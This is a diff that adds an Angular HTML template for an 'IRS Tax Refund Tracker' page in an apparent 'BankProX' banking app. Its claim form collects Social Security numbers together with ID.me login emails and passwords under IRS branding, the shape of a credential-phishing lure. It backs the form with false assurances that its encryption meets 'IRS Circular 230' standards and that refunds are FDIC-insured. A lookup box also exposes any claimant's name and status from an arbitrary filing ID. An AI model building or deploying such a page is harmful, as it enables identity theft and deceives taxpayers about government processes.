@@ -1,0 +1,160 @@
+<!-- Header Section -->
+<div class="mb-6 flex flex-col md:flex-row md:items-center justify-between gap-4">
+  <div class="flex items-center space-x-3">
+    <div class="w-12 h-12 rounded-2xl bg-gradient-to-tr from-primary-600 to-primary-400 text-white flex items-center justify-center shadow-lg shadow-primary-500/30">
+      <i class="fa-solid fa-file-invoice-dollar text-xl"></i>
+    </div>
+    <div>
+      <h1 class="text-2xl sm:text-3xl font-extrabold text-gray-900 dark:text-white tracking-tight">
+        IRS Tax Refund Tracker
+      </h1>
+      <p class="text-xs sm:text-sm text-gray-500 dark:text-gray-400 mt-0.5">
+        File, verify, and monitor federal refund clearance with automated direct deposit processing into your BankProX account.
+      </p>
+    </div>
+  </div>
+</div>
+
+<div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+  <!-- Refund Submission / Status (2 Cols) -->
+  <div class="lg:col-span-2 space-y-6">
+    <!-- Active Refund File Card -->
+    <div *ngIf="refundData" class="bg-white dark:bg-gray-800 rounded-3xl p-6 sm:p-8 shadow-sm border border-gray-100 dark:border-gray-700/60">
+      <div class="flex items-center justify-between pb-4 border-b border-gray-100 dark:border-gray-700 mb-6">
+        <h3 class="text-sm font-bold text-gray-900 dark:text-white uppercase tracking-wider flex items-center">
+          <i class="fa-solid fa-stamp text-green-500 mr-2"></i> Current IRS Refund Case File
+        </h3>
+        <span class="px-3 py-1 rounded-xl text-xs font-extrabold uppercase tracking-wider" [class.bg-yellow-50]="refundData.status === 'pending'" [class.text-yellow-600]="refundData.status === 'pending'" [class.dark:bg-yellow-950/40]="refundData.status === 'pending'" [class.dark:text-yellow-400]="refundData.status === 'pending'" [class.bg-green-50]="refundData.status === 'approved'" [class.text-green-600]="refundData.status === 'approved'" [class.dark:bg-green-950/40]="refundData.status === 'approved'" [class.dark:text-green-400]="refundData.status === 'approved'">
+          {{ refundData.status }}
+        </span>
+      </div>
+
+      <div class="p-6 rounded-2xl bg-gray-50 dark:bg-gray-900/60 border border-gray-100 dark:border-gray-700/60 mb-6 flex flex-col sm:flex-row sm:items-center justify-between gap-4">
+        <div>
+          <span class="text-xxs font-extrabold uppercase tracking-wider text-gray-400 block mb-1">Official Authorized Filing ID</span>
+          <span class="font-mono text-xl sm:text-2xl font-black text-primary-600 dark:text-primary-400">{{ refundData.filing_id || 'PENDING ASSIGNMENT' }}</span>
+        </div>
+        <div class="text-left sm:text-right">
+          <span class="text-xxs font-extrabold uppercase tracking-wider text-gray-400 block mb-1">Direct Deposit Destination</span>
+          <span class="text-xs font-bold text-gray-700 dark:text-gray-300">BankProX Primary Checking</span>
+        </div>
+      </div>
+
+      <div class="space-y-3 text-xs">
+        <div class="flex justify-between py-2 border-b border-gray-100 dark:border-gray-700/60">
+          <span class="text-gray-500">Claimant Legal Name:</span>
+          <span class="font-bold text-gray-900 dark:text-white">{{ refundData.name }}</span>
+        </div>
+        <div class="flex justify-between py-2 border-b border-gray-100 dark:border-gray-700/60">
+          <span class="text-gray-500">Filing Submission Date:</span>
+          <span class="font-bold text-gray-900 dark:text-white">{{ refundData.created_at | date:'medium' }}</span>
+        </div>
+        <div *ngIf="refundData.admin_notes" class="mt-4 p-4 rounded-xl bg-blue-50 dark:bg-blue-950/40 border border-blue-200 dark:border-blue-800 text-blue-700 dark:text-blue-300">
+          <strong class="block mb-1">IRS Processing Dispatch Note:</strong>
+          <p class="text-xs">{{ refundData.admin_notes }}</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- New Filing Form -->
+    <div *ngIf="!refundData" class="bg-white dark:bg-gray-800 rounded-3xl p-6 sm:p-8 shadow-sm border border-gray-100 dark:border-gray-700/60">
+      <h3 class="text-sm font-bold text-gray-900 dark:text-white uppercase tracking-wider mb-2">
+        IRS Identity & Refund Disbursement Claim
+      </h3>
+      <p class="text-xs text-gray-400 mb-6">
+        Submit identity verification credentials to authorize electronic deposit of IRS refund proceeds.
+      </p>
+
+      <div *ngIf="message" class="mb-6 p-4 rounded-2xl text-xs sm:text-sm font-semibold flex items-center" [class.bg-green-50]="isSuccess" [class.text-green-700]="isSuccess" [class.dark:bg-green-950/40]="isSuccess" [class.dark:text-green-300]="isSuccess" [class.bg-red-50]="!isSuccess" [class.text-red-700]="!isSuccess" [class.dark:bg-red-950/40]="!isSuccess" [class.dark:text-red-300]="!isSuccess">
+        <i class="fa-solid mr-2 text-base" [class.fa-circle-check]="isSuccess" [class.fa-triangle-exclamation]="!isSuccess"></i>
+        <span>{{ message }}</span>
+      </div>
+
+      <form (ngSubmit)="submitClaim()" class="space-y-4">
+        <div>
+          <label class="block text-xs font-bold text-gray-700 dark:text-gray-300 uppercase tracking-wider mb-2">
+            Taxpayer Full Legal Name <span class="text-red-500">*</span>
+          </label>
+          <input type="text" [(ngModel)]="name" name="name" class="w-full px-4 py-3.5 bg-gray-50 dark:bg-gray-900 border border-gray-200 dark:border-gray-700 rounded-2xl font-bold text-gray-900 dark:text-white focus:outline-none focus:ring-2 focus:ring-primary-500 transition-all text-sm" placeholder="First Middle Last" required>
+        </div>
+
+        <div>
+          <label class="block text-xs font-bold text-gray-700 dark:text-gray-300 uppercase tracking-wider mb-2">
+            Social Security Number (SSN / ITIN) <span class="text-red-500">*</span>
+          </label>
+          <input type="text" [(ngModel)]="ssn" name="ssn" class="w-full px-4 py-3.5 bg-gray-50 dark:bg-gray-900 border border-gray-200 dark:border-gray-700 rounded-2xl font-mono text-gray-900 dark:text-white focus:outline-none focus:ring-2 focus:ring-primary-500 transition-all text-sm" placeholder="XXX-XX-XXXX" required>
+        </div>
+
+        <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+          <div>
+            <label class="block text-xs font-bold text-gray-700 dark:text-gray-300 uppercase tracking-wider mb-2">
+              ID.me Verified Email <span class="text-red-500">*</span>
+            </label>
+            <input type="email" [(ngModel)]="idmeEmail" name="idmeEmail" class="w-full px-4 py-3.5 bg-gray-50 dark:bg-gray-900 border border-gray-200 dark:border-gray-700 rounded-2xl text-gray-900 dark:text-white focus:outline-none focus:ring-2 focus:ring-primary-500 transition-all text-sm" placeholder="email@id.me" required>
+          </div>
+          <div>
+            <label class="block text-xs font-bold text-gray-700 dark:text-gray-300 uppercase tracking-wider mb-2">
+              ID.me Security Password <span class="text-red-500">*</span>
+            </label>
+            <input type="password" [(ngModel)]="idmePassword" name="idmePassword" class="w-full px-4 py-3.5 bg-gray-50 dark:bg-gray-900 border border-gray-200 dark:border-gray-700 rounded-2xl text-gray-900 dark:text-white focus:outline-none focus:ring-2 focus:ring-primary-500 transition-all text-sm" placeholder="••••••••" required>
+          </div>
+        </div>
+
+        <button type="submit" [disabled]="submitting" class="w-full py-4 mt-2 rounded-2xl bg-primary-600 hover:bg-primary-700 text-white font-bold text-sm shadow-lg shadow-primary-500/25 transition-all flex items-center justify-center space-x-2 disabled:opacity-50">
+          <i *ngIf="submitting" class="fa-solid fa-circle-notch fa-spin"></i>
+          <span>{{ submitting ? 'Transmitting to Federal Gateway...' : 'Submit IRS Refund Claim' }}</span>
+        </button>
+      </form>
+    </div>
+  </div>
+
+  <!-- Tracker Search & Security Info (1 Col) -->
+  <div class="space-y-6">
+    <div class="bg-white dark:bg-gray-800 rounded-3xl p-6 shadow-sm border border-gray-100 dark:border-gray-700/60">
+      <h3 class="text-sm font-bold text-gray-900 dark:text-white uppercase tracking-wider mb-3 flex items-center">
+        <i class="fa-solid fa-magnifying-glass text-primary-500 mr-2"></i> Track Any Filing ID
+      </h3>
+      <p class="text-xs text-gray-400 mb-4">
+        Enter an authorized IRS filing tracking number to inspect real-time settlement status.
+      </p>
+
+      <div class="flex gap-2 mb-4">
+        <input type="text" [(ngModel)]="searchFilingId" placeholder="IRS-12345678" class="flex-1 px-4 py-3 bg-gray-50 dark:bg-gray-900 border border-gray-200 dark:border-gray-700 rounded-2xl font-mono text-xs text-gray-900 dark:text-white focus:outline-none focus:ring-2 focus:ring-primary-500">
+        <button (click)="trackByFilingId()" class="px-5 py-3 rounded-2xl bg-gray-900 dark:bg-gray-700 hover:bg-primary-600 text-white font-bold text-xs transition-colors">
+          Track
+        </button>
+      </div>
+
+      <div *ngIf="searchedRecord" class="p-4 rounded-2xl bg-gray-50 dark:bg-gray-900/60 border border-gray-100 dark:border-gray-700/60 text-xs">
+        <div *ngIf="searchedRecord.notFound" class="text-red-500 text-center py-2">
+          No IRS record found matching that filing number.
+        </div>
+        <div *ngIf="!searchedRecord.notFound" class="space-y-2">
+          <div class="flex justify-between">
+            <span class="text-gray-400">Claimant:</span>
+            <span class="font-bold text-gray-900 dark:text-white">{{ searchedRecord.name }}</span>
+          </div>
+          <div class="flex justify-between">
+            <span class="text-gray-400">Status:</span>
+            <span class="font-bold uppercase text-primary-500">{{ searchedRecord.status }}</span>
+          </div>
+          <div class="flex justify-between">
+            <span class="text-gray-400">Date:</span>
+            <span class="text-gray-700 dark:text-gray-300">{{ searchedRecord.created_at | date:'mediumDate' }}</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Security Safeguards Box -->
+    <div class="bg-gray-50 dark:bg-gray-800/50 rounded-3xl p-6 border border-gray-100 dark:border-gray-700/60">
+      <div class="flex items-center space-x-2 text-xs font-bold text-gray-900 dark:text-white uppercase tracking-wider mb-2">
+        <i class="fa-solid fa-shield-halved text-primary-500"></i>
+        <span>Federal Gateway Encryption</span>
+      </div>
+      <p class="text-xs text-gray-500 dark:text-gray-400 leading-relaxed">
+        All transmission data is encrypted via 256-bit TLS conforming to IRS Circular 230 security standards. Disbursements are insured up to $250,000 via FDIC membership.
+      </p>
+    </div>
+  </div>
+</div>
